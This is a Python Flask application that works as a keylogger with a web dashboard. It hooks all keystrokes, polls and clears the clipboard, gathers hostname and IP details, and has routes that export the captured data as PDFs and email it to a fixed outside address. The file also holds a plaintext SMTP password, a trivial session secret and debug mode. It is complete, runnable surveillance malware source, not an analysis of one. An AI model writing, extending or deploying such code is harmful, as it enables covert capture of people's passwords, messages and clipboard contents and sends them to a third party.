from flask import Flask, render_template, Response,request,redirect,url_for,session
from flask_mail import Mail, Message
import threading
import keyboard
import signal
import sys
import pyperclip
from io import BytesIO
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import platform
import socket
import requests
from flask_sqlalchemy import SQLAlchemy
import bcrypt





app = Flask(__name__)

app.config['MAIL_SERVER'] = 'live.smtp.mailtrap.io'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USERNAME'] = 'api'
app.config['MAIL_PASSWORD'] = 'c22edf8f9d84f904f890efb8aa1a5e78'
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False
mail = Mail(app)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
db = SQLAlchemy(app)
app.secret_key = 'secret_key'



class User(db.Model):
    id = db.Column(db.Integer, primary_key = True)
    name = db.Column(db.String(100), nullable=False)
    email = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))


    def __init__(self,email,password,name):
        self.name = name
        self.email = email
        self.password = bcrypt.hashpw(password.encode('utf-8'),bcrypt.gensalt()).decode('utf-8')

    def check_password(self,password):
        return bcrypt.checkpw(password.encode('utf-8'),self.password.encode('utf-8'))
    

with app.app_context():
    db.create_all()



# Keylogger class to capture keystrokes and clipboard content
class Keylogger:
    def __init__(self):
        self.keystrokes = []
        self.clipboard_content = []
        self.running = True
        self.current_word = ''
          # To store the current word being typed

    def start_logging(self):
        keyboard.on_press(self.on_key_press)
        keyboard.wait()  # Wait for a keyboard event indefinitely

    def on_key_press(self, event):
        key = event.name
        if key == 'space':
            if self.current_word:  # Check if current_word is not empty
                self.keystrokes.append(self.current_word)
            self.current_word = ''  # Reset the current word
        elif len(key) == 1:  # Filter out non-alphanumeric keys
            self.current_word += key
        else:
            # Capture all keys, including special keys, and add a special class to them
            self.keystrokes.append(f'<span class="special-key">{key}</span>') 

    def check_clipboard(self):
        prev_clipboard_content = None
        while self.running:
            new_clipboard_content = pyperclip.paste()
            if new_clipboard_content != prev_clipboard_content:
                self.clipboard_content.append(new_clipboard_content)
                prev_clipboard_content = new_clipboard_content
                pyperclip.copy('')  # Clear clipboard content

    def clear_keystrokes(self):
        self.keystrokes = []

    def get_clipboard_content(self):
        return self.clipboard_content
    
    def get_keystrokes(self):
        return self.keystrokes
    
def computer_information():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    system_info = {
        'Hostname': hostname,
        'Private IP Address': IPAddr,
        'Public IP Address': '',
        'Processor': platform.processor(),
        'System': platform.system(),
        'Machine': platform.machine(),
        'Platform Version': platform.version()
    }
    try:
        public_ip = requests.get("https://api.ipify.org").text
        system_info['Public IP Address'] = public_ip
    except Exception:
        system_info['Public IP Address'] = 'Could not retrieve'

    return system_info

# Create an instance of the Keylogger class
keylogger = Keylogger()

# Function to start the keylogger and clipboard monitor in separate threads
def start_keylogger():
    keylogger.start_logging()

def monitor_clipboard():
    keylogger.check_clipboard()

# Start the keylogger and clipboard monitor when the Flask application starts
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.start()

# Signal handler to clear keystrokes and clipboard content when application is terminated
def signal_handler(sig, frame):
    keylogger.clear_keystrokes()
    keylogger.running = False
    sys.exit(0)

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)



@app.route('/register',methods=['GET','POST'])
def register():
    if request.method =='POST':
        name = request.form['name']
        email = request.form['email']
        password = request.form['password']

        new_user = User(name=name,email=email,password=password)
        db.session.add(new_user)
        db.session.commit()
        return redirect('/login')

    return render_template('register.html')


@app.route('/login',methods=['GET','POST'])
def login():
    if request.method =='POST':
        email = request.form['email']
        password = request.form['password']

        user = User.query.filter_by(email=email).first()

        if user and user.check_password(password):
     
            session['email'] = user.email

            return redirect('/')
        else:
            return render_template('login.html',error='invalid user')

    return render_template('login.html')

@app.route('/')
def index():
    if 'email' in session:
        return render_template('index.html')
    else:
        return redirect('/login')
    

# Route to display logged keystrokes
@app.route('/logged_keystrokes')
def logged_keystrokes():
    keystrokes = keylogger.keystrokes
    return render_template('logged_keystrokes.html', title='Logged Keystrokes', keystrokes=keystrokes)

# Route to display clipboard content
@app.route('/clipboard_content')
def clipboard_content():
    clipboard_content = keylogger.get_clipboard_content()
    return render_template('clipboard.html', title='Clipboard Content', clipboard_content=clipboard_content)


@app.route('/system_info')
def system_info():
    system_data = computer_information()
    return render_template('systeminfo.html', title='System Information', system_data=system_data)



# Route to generate and download PDF containing clipboard content
@app.route('/download_pdf')
def download_pdf():
    clipboard_content = keylogger.get_clipboard_content()
    pdf = generate_pdf(clipboard_content)
    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=clipboard_content.pdf'})


@app.route('/download_logs_as_pdf')
def download_logs():
    logs_content = keylogger.get_keystrokes()
    pdf = generate_pdf(logs_content)
    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=logs_content.pdf'})

@app.route('/download_system_info_pdf')
def download_system_info_pdf():
    system_data = computer_information()
    pdf = generate_system_info_pdf(system_data)
    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=system_info.pdf'})

@app.route('/send_logs_email')
def send_logs_email():
    message = Message(
        subject='Logged Keystrokes PDF',
        recipients=['fekid24037@kravify.com'],
        sender='mailtrap@demomailtrap.com'
    )
    message.body = "Logs"
    logs_content = keylogger.get_keystrokes()
    pdf = generate_pdf(logs_content)
    
    message.attach('logs_content.pdf', 'application/pdf', pdf)
    mail.send(message)
    return redirect(url_for('logged_keystrokes')) 

@app.route('/send_email')
def send_email():
    message = Message(
        subject='\Clipboard Keystrokes PDF',
        recipients=['fekid24037@kravify.com'],
        sender='mailtrap@demomailtrap.com'
    )
    message.body = "Clipboard"
    clipboard_content = keylogger.get_clipboard_content()
    pdf = generate_pdf(clipboard_content)
    
    message.attach('clipboard_content.pdf', 'application/pdf', pdf)
    mail.send(message)
    return redirect(url_for('clipboard_content'))

@app.route('/send_system_email')
def send_system_email():
    message = Message(
        subject='System PDF',
        recipients=['fekid24037@kravify.com'],
        sender='mailtrap@demomailtrap.com'
    )
    system_data = computer_information()
    pdf = generate_system_info_pdf(system_data)

    
    message.attach('system_info.pdf', 'application/pdf', pdf)
    mail.send(message)


@app.route('/logout')
def logout():
    session.pop('email',None)
    return redirect('/login')


# Function to generate PDF document
def generate_pdf(content):
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    y = 750
    for item in content:
        c.drawString(50, y, item)
        y -= 20
    c.save()
    pdf = buffer.getvalue()
    buffer.close()
    return pdf


def generate_system_info_pdf(system_data):
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    y = 750
    for key, value in system_data.items():
        c.drawString(50, y, f'{key}: {value}')
        y -= 20
    c.save()
    pdf = buffer.getvalue()
    buffer.close()
    return pdf

if __name__ == '__main__':
    app.run(debug=True)



